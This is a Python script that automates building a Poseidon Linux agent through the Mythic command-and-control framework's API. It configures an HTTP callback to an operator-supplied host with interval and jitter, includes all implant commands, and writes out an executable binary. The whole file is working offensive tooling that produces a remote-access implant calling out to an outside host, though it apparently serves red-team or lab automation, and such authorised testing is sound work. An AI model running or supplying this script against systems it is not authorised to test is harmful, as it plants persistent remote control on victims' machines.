#!/usr/bin/env python3
"""
Create a Poseidon/HTTP payload via the Mythic GraphQL API.

Environment variables (all required):
  MYTHIC_IP            Mythic server IP (default: 127.0.0.1)
  MYTHIC_PORT          Mythic HTTPS port (default: 7443)
  MYTHIC_USER          Admin username
  MYTHIC_PASS          Admin password
  C2_CALLBACK_HOST     IP/hostname the payload will call back to
  C2_CALLBACK_PORT     Port the payload will call back on (default: 80)
  C2_CALLBACK_INTERVAL Seconds between callbacks (default: 60)
  C2_CALLBACK_JITTER   Jitter percentage (default: 20)
  PAYLOAD_OUTPUT       Full path to write the compiled binary
"""

import asyncio
import os
import sys

from mythic import mythic as mythic_api


async def main() -> None:
    server_ip = os.environ.get("MYTHIC_IP", "127.0.0.1")
    server_port = int(os.environ.get("MYTHIC_PORT", "7443"))
    username = os.environ.get("MYTHIC_USER", "mythic_admin")
    password = os.environ.get("MYTHIC_PASS", "")
    callback_host = os.environ.get("C2_CALLBACK_HOST", "")
    callback_port = int(os.environ.get("C2_CALLBACK_PORT", "80"))
    callback_interval = int(os.environ.get("C2_CALLBACK_INTERVAL", "60"))
    callback_jitter = int(os.environ.get("C2_CALLBACK_JITTER", "20"))
    output_path = os.environ.get("PAYLOAD_OUTPUT", "/opt/Mythic/payloads/poseidon-agent")

    if not password:
        sys.exit("[!] MYTHIC_PASS is required")
    if not callback_host:
        sys.exit("[!] C2_CALLBACK_HOST is required")

    print(f"[*] Connecting to Mythic at {server_ip}:{server_port}")
    mythic_instance = await mythic_api.login(
        username=username,
        password=password,
        server_ip=server_ip,
        server_port=server_port,
        ssl=True,
        timeout=-1,
    )
    print("[+] Authenticated")

    print("[*] Requesting Poseidon payload build...")
    resp = await mythic_api.create_payload(
        mythic=mythic_instance,
        payload_type_name="poseidon",
        filename="poseidon-linux-agent",
        operating_system="Linux",
        c2_profiles=[
            {
                "c2_profile": "http",
                "c2_profile_parameters": {
                    "callback_host": f"http://{callback_host}",
                    "callback_port": callback_port,
                    "callback_interval": callback_interval,
                    "callback_jitter": callback_jitter,
                    "encrypted_exchange_check": False,
                },
            }
        ],
        build_parameters=[
            {"name": "mode", "value": "default"},
            {"name": "architecture", "value": "amd64"},
            {"name": "os", "value": "linux"},
        ],
        include_all_commands=True,
        return_on_complete=True,
    )
    uuid = resp["uuid"]
    print(f"[+] Build complete — UUID: {uuid}")

    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    payload_bytes = await mythic_api.download_payload(mythic_instance, uuid)
    with open(output_path, "wb") as fh:
        fh.write(payload_bytes)
    os.chmod(output_path, 0o755)
    print(f"[+] Payload written to {output_path}")


asyncio.run(main())
